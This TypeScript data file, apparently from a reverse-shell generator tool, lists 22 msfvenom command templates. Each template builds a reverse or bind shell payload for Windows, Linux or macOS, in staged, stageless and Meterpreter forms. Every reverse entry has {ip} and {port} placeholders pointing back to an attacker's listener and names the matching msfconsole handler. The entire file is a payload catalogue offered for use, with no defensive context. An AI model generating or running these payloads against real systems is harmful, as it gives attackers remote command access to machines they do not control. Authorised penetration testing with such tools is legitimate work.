// To add an entry: append { name, command, os, tags, listener } to ASSEMBLED.
// Placeholders: {ip}, {port}.
// `listener` names an entry in LISTENERS (listeners.ts).
import type { Payload } from './types'

export const ASSEMBLED: Payload[] = [
  // Stageless shells, every OS and arch
  { name: 'Windows x86 reverse TCP', command: 'msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['windows'], tags: ['x86', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'Windows x86 bind TCP', command: 'msfvenom -p windows/shell_bind_tcp LPORT={port}', os: ['windows'], tags: ['x86', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  { name: 'Windows x64 reverse TCP', command: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['windows'], tags: ['x64', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'Windows x64 bind TCP', command: 'msfvenom -p windows/x64/shell_bind_tcp LPORT={port}', os: ['windows'], tags: ['x64', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  { name: 'Linux x86 reverse TCP', command: 'msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['linux'], tags: ['x86', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'Linux x86 bind TCP', command: 'msfvenom -p linux/x86/shell_bind_tcp LPORT={port}', os: ['linux'], tags: ['x86', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  { name: 'Linux x64 reverse TCP', command: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['linux'], tags: ['x64', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'Linux x64 bind TCP', command: 'msfvenom -p linux/x64/shell_bind_tcp LPORT={port}', os: ['linux'], tags: ['x64', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  { name: 'macOS x86 reverse TCP', command: 'msfvenom -p osx/x86/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['mac'], tags: ['x86', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'macOS x86 bind TCP', command: 'msfvenom -p osx/x86/shell_bind_tcp LPORT={port}', os: ['mac'], tags: ['x86', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  { name: 'macOS x64 reverse TCP', command: 'msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port}', os: ['mac'], tags: ['x64', 'reverse', 'stageless'], listener: 'msfconsole' },
  { name: 'macOS x64 bind TCP', command: 'msfvenom -p osx/x64/shell_bind_tcp LPORT={port}', os: ['mac'], tags: ['x64', 'bind', 'stageless'], listener: 'msfconsole (bind)' },
  // Staged shells (Windows, Linux)
  { name: 'Windows x86 reverse TCP (staged)', command: 'msfvenom -p windows/shell/reverse_tcp LHOST={ip} LPORT={port}', os: ['windows'], tags: ['x86', 'reverse', 'staged'], listener: 'msfconsole' },
  { name: 'Windows x86 bind TCP (staged)', command: 'msfvenom -p windows/shell/bind_tcp LPORT={port}', os: ['windows'], tags: ['x86', 'bind', 'staged'], listener: 'msfconsole (bind)' },
  { name: 'Windows x64 reverse TCP (staged)', command: 'msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port}', os: ['windows'], tags: ['x64', 'reverse', 'staged'], listener: 'msfconsole' },
  { name: 'Windows x64 bind TCP (staged)', command: 'msfvenom -p windows/x64/shell/bind_tcp LPORT={port}', os: ['windows'], tags: ['x64', 'bind', 'staged'], listener: 'msfconsole (bind)' },
  { name: 'Linux x86 reverse TCP (staged)', command: 'msfvenom -p linux/x86/shell/reverse_tcp LHOST={ip} LPORT={port}', os: ['linux'], tags: ['x86', 'reverse', 'staged'], listener: 'msfconsole' },
  { name: 'Linux x86 bind TCP (staged)', command: 'msfvenom -p linux/x86/shell/bind_tcp LPORT={port}', os: ['linux'], tags: ['x86', 'bind', 'staged'], listener: 'msfconsole (bind)' },
  { name: 'Linux x64 reverse TCP (staged)', command: 'msfvenom -p linux/x64/shell/reverse_tcp LHOST={ip} LPORT={port}', os: ['linux'], tags: ['x64', 'reverse', 'staged'], listener: 'msfconsole' },
  { name: 'Linux x64 bind TCP (staged)', command: 'msfvenom -p linux/x64/shell/bind_tcp LPORT={port}', os: ['linux'], tags: ['x64', 'bind', 'staged'], listener: 'msfconsole (bind)' },
  // Meterpreter x64 reverse
  { name: 'Windows x64 meterpreter reverse TCP (staged)', command: 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port}', os: ['windows'], tags: ['x64', 'reverse', 'staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
  { name: 'Linux x64 meterpreter reverse TCP (staged)', command: 'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port}', os: ['linux'], tags: ['x64', 'reverse', 'staged', 'meterpreter'], listener: 'msfconsole (meterpreter)' },
]
